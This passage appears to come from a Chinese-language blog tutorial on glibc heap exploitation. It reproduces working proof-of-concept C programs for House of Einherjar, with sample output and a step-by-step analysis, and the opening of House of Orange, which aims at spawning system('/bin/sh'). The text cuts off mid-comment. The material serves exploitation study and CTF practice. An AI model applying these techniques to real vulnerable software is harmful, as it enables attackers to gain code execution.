class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   Credit to st4g3r for publishing this technique</span><br><span class="line">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="line">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;Welcome to House of Einherjar!\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;);</span><br><span class="line"></span><br><span class="line">	uint8_t* a;</span><br><span class="line">	uint8_t* b;</span><br><span class="line">	uint8_t* d;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nWe allocate 0x38 bytes for &apos;a&apos;\n&quot;);</span><br><span class="line">	a = (uint8_t*) malloc(0x38);</span><br><span class="line">	fprintf(stderr, &quot;a: %p\n&quot;, a);</span><br><span class="line">    </span><br><span class="line">    int real_a_size = malloc_usable_size(a);</span><br><span class="line">    fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need the &apos;real&apos; size of &apos;a&apos; after rounding: %#x\n&quot;, real_a_size);</span><br><span class="line"></span><br><span class="line">    // create a fake chunk</span><br><span class="line">    fprintf(stderr, &quot;\nWe create a fake chunk wherever we want, in this case we&apos;ll create the chunk on the stack\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;);</span><br><span class="line"></span><br><span class="line">    size_t fake_chunk[6];</span><br><span class="line"></span><br><span class="line">    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&apos;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br><span class="line">    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin</span><br><span class="line">    fake_chunk[2] = (size_t) fake_chunk; // fwd</span><br><span class="line">    fake_chunk[3] = (size_t) fake_chunk; // bck</span><br><span class="line">    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize</span><br><span class="line">    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk);</span><br><span class="line">    fprintf(stderr, &quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]);</span><br><span class="line">    fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]);</span><br><span class="line">    fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]);</span><br><span class="line">    fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]);</span><br><span class="line">    fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]);</span><br><span class="line">    fprintf(stderr, &quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]);</span><br><span class="line"></span><br><span class="line">	/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="line">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="line">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span><br><span class="line">	b = (uint8_t*) malloc(0xf8);</span><br><span class="line">    int real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nWe allocate 0xf8 bytes for &apos;b&apos;.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;b: %p\n&quot;, b);</span><br><span class="line"></span><br><span class="line">	uint64_t* b_size_ptr = (uint64_t*)(b - 8);</span><br><span class="line">    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nb.size: %#lx\n&quot;, *b_size_ptr);</span><br><span class="line">	fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;);</span><br><span class="line">	a[real_a_size] = 0; </span><br><span class="line">	fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);</span><br><span class="line">    fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br><span class="line">           &quot;don&apos;t change the size of b, only its prev_inuse bit\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot;</span><br><span class="line">           &quot;b where it will try to consolidate the next chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">    // Write a fake prev_size to the end of a</span><br><span class="line">    fprintf(stderr, &quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br><span class="line">           &quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t));</span><br><span class="line">    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);</span><br><span class="line">    fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);</span><br><span class="line">    *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;</span><br><span class="line"></span><br><span class="line">    //Change the fake chunk&apos;s size to reflect b&apos;s new prev_size</span><br><span class="line">    fprintf(stderr, &quot;\nModify fake chunk&apos;s size to reflect b&apos;s new prev_size\n&quot;);</span><br><span class="line">    fake_chunk[1] = fake_size;</span><br><span class="line"></span><br><span class="line">    // free b and it will consolidate with our fake chunk</span><br><span class="line">    fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;);</span><br><span class="line">    free(b);</span><br><span class="line">    fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]);</span><br><span class="line"></span><br><span class="line">    //if we allocate another chunk before we free b we will need to </span><br><span class="line">    //do two things: </span><br><span class="line">    //1) We will need to adjust the size of our fake chunk so that</span><br><span class="line">    //fake_chunk + fake_chunk&apos;s size points to an area we control</span><br><span class="line">    //2) we will need to write the size of our fake chunk</span><br><span class="line">    //at the location we control. </span><br><span class="line">    //After doing these two things, when unlink gets called, our fake chunk will</span><br><span class="line">    //pass the size(P) == prev_size(next_chunk(P)) test. </span><br><span class="line">    //otherwise we need to make sure that our fake chunk is up against the</span><br><span class="line">    //wilderness</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;);</span><br><span class="line">    d = malloc(0x200);</span><br><span class="line">    fprintf(stderr, &quot;Next malloc(0x200) is at %p\n&quot;, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Welcome to House of Einherjar!</span><br><span class="line">Tested in Ubuntu 16.04 64bit.</span><br><span class="line">This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.</span><br><span class="line"></span><br><span class="line">We allocate 0x38 bytes for &apos;a&apos;</span><br><span class="line">a: 0x1147010</span><br><span class="line">Since we want to overflow &apos;a&apos;, we need the &apos;real&apos; size of &apos;a&apos; after rounding: 0x38</span><br><span class="line"></span><br><span class="line">We create a fake chunk wherever we want, in this case we&apos;ll create the chunk on the stack</span><br><span class="line">However, you can also create the chunk in the heap or the bss, as long as you know its address</span><br><span class="line">We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span><br><span class="line">(although we could do the unsafe unlink technique here in some scenarios)</span><br><span class="line">Our fake chunk at 0x7fff79af29a0 looks like:</span><br><span class="line">prev_size (not used): 0x100</span><br><span class="line">size: 0x100</span><br><span class="line">fwd: 0x7fff79af29a0</span><br><span class="line">bck: 0x7fff79af29a0</span><br><span class="line">fwd_nextsize: 0x7fff79af29a0</span><br><span class="line">bck_nextsize: 0x7fff79af29a0</span><br><span class="line"></span><br><span class="line">We allocate 0xf8 bytes for &apos;b&apos;.</span><br><span class="line">b: 0x1147050</span><br><span class="line"></span><br><span class="line">b.size: 0x101</span><br><span class="line">b.size is: (0x100) | prev_inuse = 0x101</span><br><span class="line">We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;</span><br><span class="line">b.size: 0x100</span><br><span class="line">This is easiest if b.size is a multiple of 0x100 so you don&apos;t change the size of b, only its prev_inuse bit</span><br><span class="line">If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk</span><br><span class="line"></span><br><span class="line">We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk</span><br><span class="line">Our fake prev_size will be 0x1147040 - 0x7fff79af29a0 = 0xffff8000876546a0</span><br><span class="line"></span><br><span class="line">Modify fake chunk&apos;s size to reflect b&apos;s new prev_size</span><br><span class="line">Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set</span><br><span class="line">Our fake chunk size is now 0xffff800087675661 (b.size + fake_prev_size + top_chunk.size)</span><br><span class="line"></span><br><span class="line">Now we can call malloc() and it will begin in our fake chunk</span><br><span class="line">Next malloc(0x200) is at 0x7fff79af29b0</span><br></pre></td></tr></table></figure>
<p>分析：</p>
<ul>
<li>定义变量a,b,c并初始化a</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint8_t* a;</span><br><span class="line">uint8_t* b;</span><br><span class="line">uint8_t* d;</span><br><span class="line"></span><br><span class="line">a = (uint8_t*) malloc(0x38);</span><br><span class="line">    </span><br><span class="line">int real_a_size = malloc_usable_size(a);</span><br></pre></td></tr></table></figure>
<ul>
<li>创建一个伪造堆块</li>
</ul>
<p>该chunk可以是我们想要的任何地方，在这个案例中，将在stack创造fake chunk。</p>
<p>你也可以在heap或者bss段构造fake chunk，只要你知道它的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// create a fake chunk</span><br><span class="line">size_t fake_chunk[6];</span><br><span class="line"></span><br><span class="line">// prev_size is now used and must equal fake_chunk&apos;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br><span class="line">fake_chunk[0] = 0x100; </span><br><span class="line"></span><br><span class="line">// size of the chunk just needs to be small enough to stay in the small bin</span><br><span class="line">fake_chunk[1] = 0x100;</span><br><span class="line"></span><br><span class="line">fake_chunk[2] = (size_t) fake_chunk; // fwd</span><br><span class="line">fake_chunk[3] = (size_t) fake_chunk; // bck</span><br><span class="line">fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize</span><br><span class="line">fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize</span><br></pre></td></tr></table></figure>
<ul>
<li>在创建一个chunk b</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b = (uint8_t*) malloc(0xf8);</span><br><span class="line">int real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line">uint64_t* b_size_ptr = (uint64_t*)(b - 8);</span><br></pre></td></tr></table></figure>
<ul>
<li>假设chunk a存在off_by_one溢出，或者其他方法，修改chunk b的size字段</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[real_a_size] = 0;</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk b写一个fake prev_size，这样，free(b)的时候，chunk b将和fake chunk联合起来(consolidate)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);</span><br><span class="line">*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;</span><br></pre></td></tr></table></figure>
<ul>
<li>修改fake chunk的size字段来反应chunk b新的prev_size，然后释放b</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk[1] = fake_size;</span><br><span class="line"></span><br><span class="line">// free b and it will consolidate with our fake chunk，同时和top_chunk 合并</span><br><span class="line">free(b);</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一个新的chunk,该chunk将处于fake chunk处。</li>
</ul>
<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h1><p>核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin)。 这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="line">  It requires a leak of the heap and the libc</span><br><span class="line">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   This function is just present to emulate the scenario where</span><br><span class="line">   the address of the function system is known.</span><br><span class="line">*/</span><br><span class="line">int winner ( char *ptr);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="line">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="line">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="line">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="line">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="line">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="line">      there are two possibilities:</span><br><span class="line">       1) Extend the Top chunk</span><br><span class="line">       2) Mmap a new page</span><br><span class="line">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br><span class="line">        &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;);</span><br><span class="line">  </span><br><span class="line">    fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br><span class="line">        &quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      Firstly, lets allocate a chunk on the heap.</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    p1 = malloc(0x400-16);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="line">       Since we&apos;ve allocate a chunk of size 0x400 already,</span><br><span class="line">       what&apos;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="line"></span><br><span class="line">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="line">       it must also be page aligned at the end.</span><br><span class="line"></span><br><span class="line">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="line">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="line"></span><br><span class="line">       So that means that there are two conditions that must always be true.</span><br><span class="line">        1) Top chunk + size has to be page aligned</span><br><span class="line">        2) Top chunk&apos;s prev_inuse bit has to be set.</span><br><span class="line"></span><br><span class="line">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="line">       What&apos;s left is 0x20c01</span><br><span class="line"></span><br><span class="line">       Now, let&apos;s satisfy the conditions</span><br><span class="line">       1) Top chunk + size has to be page aligned</span><br><span class="line">       2) Top chunk&apos;s prev_inuse bit has to be set.</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    top[1] = 0xc01;</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="line">       Malloc tries to service this request by extending the Top chunk</span><br><span class="line">       This forces sysmalloc to be invoked.</span><br><span class="line"></span><br><span class="line">       In the usual scenario, the heap looks like the following</span><br><span class="line">          |------------|------------|------...----|</span><br><span class="line">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="line">          |------------|------------|------...----|</span><br><span class="line">      heap start                              heap end</span><br><span class="line"></span><br><span class="line">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="line">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="line"></span><br><span class="line">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="line">       which is basically a temporary chunk.</span><br><span class="line"></span><br><span class="line">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="line"></span><br><span class="line">       In our scenario however, the heap looks like</span><br><span class="line">          |------------|------------|------..--|--...--|---------|</span><br><span class="line">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="line">          |------------|------------|------..--|--...--|---------|</span><br><span class="line">     heap start                            heap end</span><br><span class="line"></span><br><span class="line">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="line">       So the area between the second chunk and the heap end is unused.</span><br><span class="line">       And the old Top chunk gets freed.</span><br><span class="line">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="line">       it gets added to list of unsorted bins.</span><br><span class="line">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="line">       This forces sysmalloc to be invoked.</span><br><span class="line">       And ultimately invokes _int_free</span><br><span class="line"></span><br><span class="line">       Finally the heap looks like this:</span><br><span class="line">          |------------|------------|------..--|--...--|---------|</span><br><span class="line">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="line">          |------------|------------|------..--|--...--|---------|</span><br><span class="line">     heap start                                             new heap end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    p2 = malloc(0x1000);</span><br><span class="line">    /*</span><br><span class="line">      Note that the above chunk will be allocated in a different page</span><br><span class="line">      that gets mmapped. It will be placed after the old heap&apos;s end</span><br><span class="line"></span><br><span class="line">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="line">      top chunk so we could overwrite the chunk&apos;s size.</span><br><span class="line">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="line">      of this chunk in the unsorted bin list.</span><br><span class="line">      There are two common ways to exploit the current state:</span><br><span class="line">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="line">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="line">          libc&apos;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="line"></span><br><span class="line">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="line">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="line"></span><br><span class="line">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="line">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="line">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="line">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="line">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="line"></span><br><span class="line">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="line">      _IO_OVERLOW points to system and whose first 8 bytes are set to &apos;/bin/sh&apos;, so</span><br><span class="line">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&apos;/bin/sh&apos;).</span><br><span class="line">      More about file-pointer exploitation can be found here:</span><br><span class="line">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="line"></span><br><span class="line">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span><br><span class="line">      currently point to the libc&apos;s main_arena.</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    io_list_all = top[2] + 0x9a8;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="line">      which has now been added to the unsorted bins.</span><br><span class="line"></span><br><span class="line">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="line">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="line">      in libc&apos;s main_arena.</span><br><span class="line"></span><br><span class="line">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="line">      case.</span><br><span class="line"></span><br><span class="line">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="line">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="line">    